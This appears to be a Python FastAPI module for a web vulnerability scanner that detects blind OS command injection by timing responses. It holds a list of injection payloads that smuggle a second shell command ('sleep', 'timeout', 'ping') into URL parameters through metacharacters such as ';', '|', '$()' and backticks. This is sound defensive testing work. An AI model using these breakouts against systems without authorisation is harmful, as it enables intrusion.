"""Time-based blind command injection scanner.

Zero-FP via timing differential confirmation, same approach as SQLi
but targeting shell metacharacters that escape into OS command exec.

  1. Baseline = median of 3 requests with original parameter value.
  2. Inject `sleep 5` (Linux) / `timeout 5` (Windows) across 10
     shell-metacharacter variants (; | & $() backticks newline etc.).
  3. If delta >= 4s, candidate.
  4. Verify with 2s variant — delta must be 1.5-3.5s.
  5. Both conditions hold -> CRITICAL command injection.
"""
import time
import statistics
import urllib.parse
from fastapi import APIRouter, Depends

from tools._shared import (
    ScanRequest, verify_scan_quota, web_url,
    safe_get, wrap_finding, standard_response,
)

router = APIRouter()


CMD_PAYLOADS = [
    ("Linux ;sleep",      ";sleep {s}"),
    ("Linux |sleep",      "|sleep {s}"),
    ("Linux &sleep",      "&sleep {s}"),
    ("Linux $()",         "$(sleep {s})"),
    ("Linux backticks",   "`sleep {s}`"),
    ("Linux %0a",         "%0asleep {s}"),
    ("Linux quoted",      "'\"; sleep {s} #"),
    ("Windows |timeout",  "|timeout /T {s}"),
    ("Windows &timeout",  "&timeout /T {s}"),
    ("Windows ping",      "&ping -n {s} 127.0.0.1"),
]


def _inject_param(url, param, value):
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)))


def _timed(url, req, timeout=15):
    t0 = time.time()
    r = safe_get(url, req=req, allow_redirects=True, timeout=timeout)
    if r is None:
        return None
    return time.time() - t0


def _baseline(url, req, samples=3):
    times = []
    for _ in range(samples):
        t = _timed(url, req, timeout=8)
        if t is not None:
            times.append(t)
    if len(times) < 2:
        return None
    return statistics.median(times)


@router.post("/api/scan/cmd_injection")
async def scan_cmd_injection(req: ScanRequest, _=Depends(verify_scan_quota)):
    url = web_url(req.target)
    findings = []
    tests = 0
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    if not qs:
        return standard_response(
            tool="cmd_injection", target=req.target, findings=[],
            tests_performed=1, vulnerable=False,
            skipped_reason="No URL parameters present — append ?host=1.1.1.1 (or similar) to test",
        )

    raw_results = []
    for param, orig_values in qs.items():
        orig = orig_values[0] if orig_values else "127.0.0.1"
        tests += 1
        baseline_url = _inject_param(url, param, orig)
        baseline = _baseline(baseline_url, req, samples=3)
        if baseline is None or baseline > 6:
            raw_results.append({"param": param, "result": "baseline failed or too slow", "baseline": baseline})
            continue
        confirmed = None
        for variant, template in CMD_PAYLOADS:
            payload_5 = orig + template.format(s=5)
            t5 = _timed(_inject_param(url, param, payload_5), req, timeout=15)
            if t5 is None:
                continue
            delta_5 = t5 - baseline
            if delta_5 >= 4.0:
                payload_2 = orig + template.format(s=2)
                t2 = _timed(_inject_param(url, param, payload_2), req, timeout=15)
                if t2 is None:
                    continue
                delta_2 = t2 - baseline
                if 1.5 <= delta_2 <= 3.5:
                    confirmed = {"variant": variant, "payload": payload_5,
                                 "baseline_s": round(baseline, 2),
                                 "sleep5_s": round(t5, 2), "delta_5_s": round(delta_5, 2),
                                 "sleep2_s": round(t2, 2), "delta_2_s": round(delta_2, 2)}
                    break
        if confirmed:
            findings.append(wrap_finding(
                f"Command injection in parameter '{param}' ({confirmed['variant']})",
                "CRITICAL", cwe="CWE-78", owasp="A03:2021",
                evidence_marker=f"baseline={confirmed['baseline_s']}s, sleep(5)={confirmed['sleep5_s']}s (delta {confirmed['delta_5_s']}s), sleep(2)={confirmed['sleep2_s']}s (delta {confirmed['delta_2_s']}s); payload: {confirmed['payload'][:80]}",
                remediation="NEVER pass user input directly to shell exec. Use language-level subprocess APIs with argv form (no shell=True). If shell execution is unavoidable, strictly validate against an allow-list.",
                tests_performed=1,
                cvss="9.8",
            ))
            raw_results.append({"param": param, "result": "VULNERABLE", **confirmed})
        else:
            raw_results.append({"param": param, "result": "safe", "baseline": round(baseline, 2)})

    return standard_response(
        tool="cmd_injection", target=req.target, findings=findings,
        tests_performed=tests,
        tests_summary=f"Tested {tests} parameter(s) with {len(CMD_PAYLOADS)} shell-metachar variants each, verified via sleep(5)+sleep(2) timing differential",
        raw_data={"cmd_injection": {"params_tested": tests, "vulnerable_count": len(findings), "results": raw_results}},
    )


def register(app):
    app.include_router(router)
